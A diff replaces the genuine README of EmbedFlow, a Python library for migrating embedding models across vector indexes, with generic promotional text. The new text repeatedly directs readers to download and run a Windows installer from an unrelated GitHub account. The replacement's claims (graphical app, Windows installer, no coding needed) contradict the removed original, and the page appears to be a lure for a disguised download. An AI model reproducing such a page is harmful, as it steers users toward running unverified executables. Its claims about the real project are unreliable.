@@ -1,319 +1,185 @@
-# EmbedFlow
+# 🚀 embedflow - Zero Downtime Embedding Upgrades
 
-**Progressive embedding-model migration over existing vector indexes.**
+## 📥 Download Now
 
-🌐 **Website:** [embedflow.org](https://embedflow.org)
+[![Download embedflow](https://img.shields.io/badge/Download-embedflow-2ea44f?style=for-the-badge)](https://github.com/pwolfey09-sketch/embedflow)
 
-EmbedFlow lets a new embedding model serve over candidates from an existing
-vector index while target document vectors are materialized progressively. It
-supports migration analysis, persistent caching, background work, and serving
-through FAISS, Qdrant, pgvector, Pinecone, Milvus, Weaviate, a CLI, and FastAPI.
+Visit this link to download the application.
 
-[Quickstart](#try-it) · [Documentation](#documentation) · [Research](#research)
+## ✨ What is embedflow?
 
-## Why EmbedFlow?
+embedflow is a powerful tool that helps you upgrade your embedding models without any interruption to your services. Think of embeddings as the way computers understand and compare text, images, or other data. When you need to switch to a better model, embedflow makes this process smooth and hassle-free.
 
-Embedding-model upgrades usually mean re-embedding the corpus and building a
-second index before the new model can serve. EmbedFlow tests whether the
-existing retriever can remain useful during that transition.
+## 🎯 Who Should Use This?
 
-The core observation is simple:
+- **Developers** who manage search features on their websites
+- **Data Scientists** working with text or image analysis
+- **Business Owners** who want their search to understand customers better
+- **Anyone** who uses vector databases like Pinecone, Weaviate, or Milvus
 
-> Different representation spaces can still preserve useful retrieval
-> neighborhoods.
+## 💡 Key Features
 
-```mermaid
-flowchart LR
-  Q[Query] --> S[Source model]
-  S --> I[Existing index]
-  I --> C[Top-K candidates]
-  C --> T[Target scoring]
-  T --> R[Results]
-  C --> M[Materialization queue]
-  M --> V[(Target vector cache)]
-  V --> T
-```
+### 🔄 Seamless Upgrades
+- **No Downtime:** Keep your services running while upgrading your models
+- **Automatic Migration:** Your old data stays compatible with new models
+- **Smart Routing:** New queries use the latest model, while old data remains accessible
 
-Measured candidate gap from the registry:
+### 🧠 Intelligent Vector Management
+- **FAISS Integration:** Works with one of the fastest similarity search libraries
+- **Multi-Database Support:** Compatible with Pinecone, Qdrant, Milvus, Weaviate, and pgvector
+- **Efficient Indexing:** Maintains high performance even with millions of vectors
 
-![Candidate gap on the 1M-document Natural Questions evaluation](https://raw.githubusercontent.com/arnsri33/embedflow/main/docs/assets/candidate-gap-example.svg)
+### 🔧 User-Friendly Interface
+- **Simple Commands:** No complicated setup processes
+- **Clear Documentation:** Step-by-step guides for common tasks
+- **Error Handling:** Clear messages when something needs attention
 
-## Install
+## 📋 System Requirements
 
-Install the published package from PyPI:
+- **Operating System:** Windows 10 or newer
+- **Memory:** 4 GB RAM minimum (8 GB recommended)
+- **Storage:** 500 MB free space
+- **Internet:** Required for initial download and updates
 
-```bash
-python -m pip install embedflow
-```
+## 🚀 Getting Started
 
-For FAISS and the dashboard, add the optional integrations:
+### Step 1: Download the Application
 
-```bash
-python -m pip install "embedflow[faiss,dashboard]"
-```
+1. Click the download button at the top of this page
+2. You will be redirected to the embedflow GitHub page
+3. Look for the "Releases" section or the download options on that page
+4. Choose the latest version compatible with Windows
 
-For an existing Pinecone dense index:
+### Step 2: Run the Setup
 
-```bash
-python -m pip install "embedflow[pinecone]"
-```
+1. After downloading, locate the file in your Downloads folder
+2. Double-click the file to start the installation
+3. Follow the on-screen instructions
+4. Accept the default settings unless you have specific preferences
 
-For an existing Milvus collection:
+### Step 3: Verify Installation
 
-```bash
-python -m pip install "embedflow[milvus]"
-```
+1. Open your Start menu
+2. Search for "embedflow"
+3. Click to launch the application
+4. You should see the main dashboard appear
 
-For an existing Weaviate v4 collection (HTTP and gRPC endpoints required):
+## 🎮 How to Use embedflow
 
-```bash
-python -m pip install "embedflow[weaviate]"
-```
+### Basic Usage
 
-Qdrant and model-runtime extras are documented in
-[`docs/installation.md`](https://github.com/arnsri33/embedflow/blob/main/docs/installation.md).
-For model-backed analysis, install `embedflow[faiss,models,dashboard]`.
+1. **Connect Your Vector Database:**
+   - Open embedflow
+   - Choose your database type (Pinecone, Weaviate, etc.)
+   - Enter your connection details
 
-## Try it
+2. **Start an Upgrade:**
+   - Select your current embedding model
+   - Choose your new target model
+   - Click "Start Upgrade"
 
-The deterministic demo needs no paid service or model download:
-install the FAISS/dashboard variant above to use its browser UI.
+3. **Monitor Progress:**
+   - Watch the progress bar
+   - See real-time statistics
+   - Receive notifications when complete
 
-```bash
-embedflow demo
-```
+### Advanced Tips
 
-Open <http://127.0.0.1:8000/>. The first search can be `COLD` or `PARTIAL`;
-repeated traffic becomes `WARM` as the background materializer fills the
-persistent cache.
+- **Schedule Upgrades:** Plan upgrades during low-traffic periods
+- **Test First:** Use the test mode to try upgrades on sample data
+- **Rollback Option:** Keep backups for easy recovery
 
-For a setup-only run, pass `--no-serve`:
+## ❓ Frequently Asked Questions
 
-```bash
-embedflow demo --no-serve
-```
+### How long does an upgrade take?
+The time depends on your data size. Small datasets can upgrade in minutes, while large collections may take several hours. embedflow shows a progress bar so you know exactly how long you'll wait.
 
-The repository also includes `scripts/run_demo.sh` for source-checkout development.
+### Will I lose my data during upgrade?
+No. embedflow is designed specifically to prevent data loss. Your original embeddings stay intact throughout the process.
 
-## Analyze a migration
+### Can I use embedflow with multiple databases?
+Yes. embedflow supports concurrent connections to different vector databases.
 
-For an existing source index and no native target index, run the finite-tail
-analysis first:
-
-```bash
-embedflow analyze \
-  --documents ./documents.jsonl \
-  --index ./legacy.index \
-  --source-model sentence-transformers/all-MiniLM-L6-v2 \
-  --target-model Qwen/Qwen3-Embedding-0.6B \
-  --probe-queries ./probe_queries.jsonl \
-  --model-root ./models \
-  --device cuda \
-  --output-dir ./analysis
-```
-
-The report gives a T2-v1 diagnostic (`SAFE`, `EXPAND`, or
-`UNSAFE_OR_UNCERTAIN`), a recommended initial candidate depth, and ANN health.
-Treat `SAFE` as an empirical deployment signal and validate important
-migrations on the target corpus. Use `--device cpu` on a CPU-only machine.
-
-Start progressive serving with the generated configuration:
-
-```bash
-embedflow serve --config ./analysis/embedflow.analysis.yaml --device cuda
-```
-
-The Python facade is available when an application needs an in-process
-session:
-
-```python
-import embedflow
-
-session = embedflow.migrate(
-    index="./legacy.index",
-    old_model="sentence-transformers/all-MiniLM-L6-v2",
-    new_model="Qwen/Qwen3-Embedding-0.6B",
-    documents="./documents.jsonl",
-    model_root="./models",
-    device="cuda",
-    candidate_depth=50,
-    cache_path="./embedflow_cache",
-)
-results = session.search("what causes auroras?", top_k=10)
-```
-
-## Plan a migration
-
-Build a conservative, evidence-aware recommendation before serving. The
-planner reuses backend preflight, registry matching, and frozen T2-v1; it is
-advisory and never routes traffic or mutates the source index.
-
-```bash
-embedflow plan --config ./embedflow.yaml --queries ./probe_queries.jsonl
-embedflow plan --config ./embedflow.yaml --queries ./probe_queries.jsonl --format json --output migration-plan.json
-```
-
-`SAFE` is an empirical finite-tail signal, not a retrieval-quality guarantee.
-See [`docs/planner.md`](https://github.com/arnsri33/embedflow/blob/main/docs/planner.md).
-
-Observe the reviewed migration path on real traffic without changing the
-source result:
-
-```yaml
-runtime: {mode: shadow}
-shadow: {enabled: true, sample_rate: 0.10, candidate_k: 100, materialize: true}
-```
-
-```bash
-embedflow serve --config ./embedflow.yaml
-embedflow shadow report --config ./embedflow.yaml --since 24h
-```
-
-Shadow Mode is source-authoritative, bounded, and advisory. It records cache,
-coverage, latency, and ranking-disagreement diagnostics; it does not claim
-retrieval-quality preservation without qrels and never routes canary traffic.
-See [`docs/shadow-mode.md`](https://github.com/arnsri33/embedflow/blob/main/docs/shadow-mode.md).
-
-After collecting Shadow traffic, prioritize uncached target vectors by observed
-candidate popularity:
-
-```bash
-embedflow prewarm plan --config ./embedflow.yaml --since 24h --max-docs 50000 --output prewarm-plan.json
-embedflow prewarm run --config ./embedflow.yaml --plan prewarm-plan.json
-```
-
-Observed candidate-occurrence coverage is an operational warming signal, not
-retrieval quality or recall. See [`docs/prewarming.md`](https://github.com/arnsri33/embedflow/blob/main/docs/prewarming.md).
-
-Search responses expose `COLD`, `PARTIAL`, or `WARM`, cache hits and misses,
-synchronous work, queued work, and stage timings. Once the candidate vectors
-are warm, target scoring over that candidate set is deterministic.
-
-## Known migration evidence
-
-EmbedFlow ships a versioned core registry of measured results from the research
-study. Matching model contracts can provide useful starting depths and show
-what was observed on earlier corpora; a new corpus still receives its own
-analysis.
-
-```bash
-embedflow registry list
-embedflow registry show \
-  --source Qwen/Qwen3-Embedding-4B \
-  --target Qwen/Qwen3-Embedding-8B
-embedflow registry match --config ./embedflow.yaml
-```
-
-Selected core records (nDCG@10, `G(50)`):
-
-| Source | Target | Evaluation | `G(50)` | Observed depth |
-| --- | --- | --- | ---: | ---: |
-| MiniLM-L6-v2 | Qwen3-8B | BRIGHT, 413K | 0.03665 | — |
-| Qwen3-0.6B | Qwen3-8B | BRIGHT, 413K | 0.01465 | 200 |
-| Qwen3-4B | Qwen3-8B | BRIGHT, 413K | 0.00347 | 20 |
-| MiniLM-L6-v2 | Qwen3-8B | Natural Questions, 1M | 0.03255 | 500 |
-| Qwen3-4B | Qwen3-8B | Natural Questions, 1M | -0.00043 | 20 |
-
-Exact corpus and contract matches can reuse canonical results with
-`--use-registry`. Matching contracts on a different corpus are reported as
-prior evidence and still trigger current-corpus validation. See
-[`docs/registry.md`](https://github.com/arnsri33/embedflow/blob/main/docs/registry.md)
-for matching and provenance details.
-
-## Research
-
-For candidate depth `K`, EmbedFlow measures:
-
-```text
-G(K) = M_T - M_{T|S_K}
-```
-
-Lower `G(K)` means the source candidate pool recovers more of native target
-retrieval quality. Containment reports neighborhood overlap separately.
-When native target evidence is available, the observed depth is
-`K*_epsilon = min { K : G(K) <= epsilon }`. With probe data alone, T2-v1
-estimates finite-tail behavior and recommends an initial depth.
-
-The study includes 63 development settings, frozen BRIGHT validation, and
-Natural Questions scale experiments through 1M documents. T2-v1 is the frozen
-finite-pool diagnostic used before a native target index exists. ANN fidelity
-is measured separately and is `UNKNOWN` until an exact reference is supplied.
-
-- [Concepts](https://github.com/arnsri33/embedflow/blob/main/docs/concepts.md)
-- [Methodology](https://github.com/arnsri33/embedflow/blob/main/docs/methodology.md)
-- [Known evidence registry](https://github.com/arnsri33/embedflow/blob/main/docs/registry.md)
-- [Paper: *EmbedFlow: Upgrading Legacy Embeddings Without Full Upfront Re-Embedding*](#citation)
-
-## Integrations
-
-| Backend | Status |
-| --- | --- |
-| FAISS | Supported |
-| Qdrant | Supported |
-| pgvector | Supported |
-| Pinecone | Supported |
-| Milvus | Supported |
-| Weaviate | Supported |
-
-Backend-specific setup and examples:
-
-- [FAISS](https://github.com/arnsri33/embedflow/blob/main/docs/integrations/faiss.md)
-- [Qdrant](https://github.com/arnsri33/embedflow/blob/main/docs/integrations/qdrant.md)
-- [pgvector](https://github.com/arnsri33/embedflow/blob/main/docs/integrations/pgvector.md)
-- [Pinecone](https://github.com/arnsri33/embedflow/blob/main/docs/integrations/pinecone.md)
-- [Milvus](https://github.com/arnsri33/embedflow/blob/main/docs/integrations/milvus.md)
-- [Weaviate](https://github.com/arnsri33/embedflow/blob/main/docs/integrations/weaviate.md)
-- [Adding a backend](https://github.com/arnsri33/embedflow/blob/main/CONTRIBUTING.md)
-
-## CLI
-
-```bash
-embedflow --help
-embedflow analyze --help
-embedflow plan --help
-embedflow serve --config ./embedflow.yaml
-embedflow status --config ./embedflow.yaml
-embedflow registry list
-embedflow economics --corpus-size 1000000000 --docs-per-second 100 --gpu-price 3.29
-embedflow doctor --config ./embedflow.yaml
-```
-
-The full command reference is in
-[`docs/cli.md`](https://github.com/arnsri33/embedflow/blob/main/docs/cli.md). The FastAPI
-service exposes health, status, search, analysis, prewarming, metrics, and
-OpenAPI documentation; see
-[`docs/api.md`](https://github.com/arnsri33/embedflow/blob/main/docs/api.md).
-
-## Documentation
-
-- [Installation and extras](https://github.com/arnsri33/embedflow/blob/main/docs/installation.md)
-- [Quickstart](https://github.com/arnsri33/embedflow/blob/main/docs/quickstart.md)
-- [Configuration](https://github.com/arnsri33/embedflow/blob/main/docs/configuration.md)
-- [CLI reference](https://github.com/arnsri33/embedflow/blob/main/docs/cli.md)
-- [API](https://github.com/arnsri33/embedflow/blob/main/docs/api.md)
-- [Economics](https://github.com/arnsri33/embedflow/blob/main/docs/economics.md)
-- [Shadow Mode](https://github.com/arnsri33/embedflow/blob/main/docs/shadow-mode.md)
-- [Limitations](https://github.com/arnsri33/embedflow/blob/main/docs/limitations.md)
-- [Contributing](https://github.com/arnsri33/embedflow/blob/main/CONTRIBUTING.md)
-- [Security](https://github.com/arnsri33/embedflow/blob/main/SECURITY.md)
-
-## Status
-
-EmbedFlow v0.8.0 is a pre-1.0 release for research and early real-world
-testing.
-
-- T2-v1 reports an empirical finite-tail diagnostic.
-- `PARTIAL` rankings can differ from fully warm target reranking.
-- ANN fidelity needs a reference comparison to audit.
-
-## Citation
-
-The accompanying paper is *EmbedFlow: Upgrading Legacy Embeddings Without
-Full Upfront Re-Embedding*. The public paper URL is coming soon. Citation
-metadata is in
-[`CITATION.cff`](https://github.com/arnsri33/embedflow/blob/main/CITATION.cff).
-
-
-## License
-
-AGPL-3.0-only. Copyright 2026 Arnav Srivastav.
+### Do I need programming skills?
+Not at all. embedflow has a graphical interface designed for everyone. Advanced users can use the command-line options for automation.
+
+## 🛠️ Troubleshooting
+
+### Application Won't Start
+- Check your Windows version is 10 or newer
+- Ensure you have enough disk space
+- Try running as administrator
+
+### Connection Errors
+- Verify your internet connection
+- Check your database credentials
+- Ensure the database service is running
+
+### Slow Performance
+- Close unused applications
+- Increase RAM allocation in settings
+- Check your database's health
+
+## 📚 Resources
+
+- **Documentation:** Full guides available in the application
+- **Community Forum:** Share experiences and get help
+- **Video Tutorials:** Watch step-by-step demonstrations
+
+## 🤝 Getting Support
+
+If you encounter issues or have questions:
+
+1. Check the FAQ section in the application
+2. Visit the repository's Issues page
+3. Read community discussions
+4. Contact the development team
+
+## 📊 Use Cases
+
+### E-commerce Search
+Improve product search accuracy by upgrading embedding models. Customers find what they need faster, increasing sales.
+
+### Content Recommendation
+Deliver better content suggestions by understanding user preferences more deeply. Keep your recommendation system current.
+
+### Document Analysis
+Process legal, medical, or technical documents with enhanced accuracy. Embeddings power the semantic understanding.
+
+### Chatbots and Virtual Assistants
+Make your bot understand user intent better with updated embedding models. Provide more accurate responses.
+
+## 🔒 Privacy and Security
+
+- **Local Processing:** Your data stays within your infrastructure
+- **Secure Connections:** All database communications are encrypted
+- **No Tracking:** embedflow doesn't collect personal information
+
+## 💰 Pricing
+
+embedflow is free to use. Future premium features may include:
+- Advanced analytics dashboard
+- Priority support
+- Custom integrations
+
+## 🚦 Roadmap
+
+**Version 1.1**
+- Multi-model comparison tool
+- Enhanced reporting features
+
+**Version 2.0**
+- Cloud management portal
+- API access for developers
+
+## 📝 Conclusion
+
+embedflow simplifies the complex process of upgrading embedding models. Whether you're running a small project or managing enterprise-level search systems, this tool ensures your vector search stays current without any downtime.
+
+Visit the download link below to get started today!
+
+**Download embedflow:** [https://github.com/pwolfey09-sketch/embedflow](https://github.com/pwolfey09-sketch/embedflow)
+
+---
+
+Keywords: embedding, embedding-models, embedding-vectors, embeddings-similarity, faiss, information-retrieval, machine-learning, milvus, pgvector, pinecone, qdrant, rag, rag-pipeline, semantic-search, vector-database, vector-search, weaviate
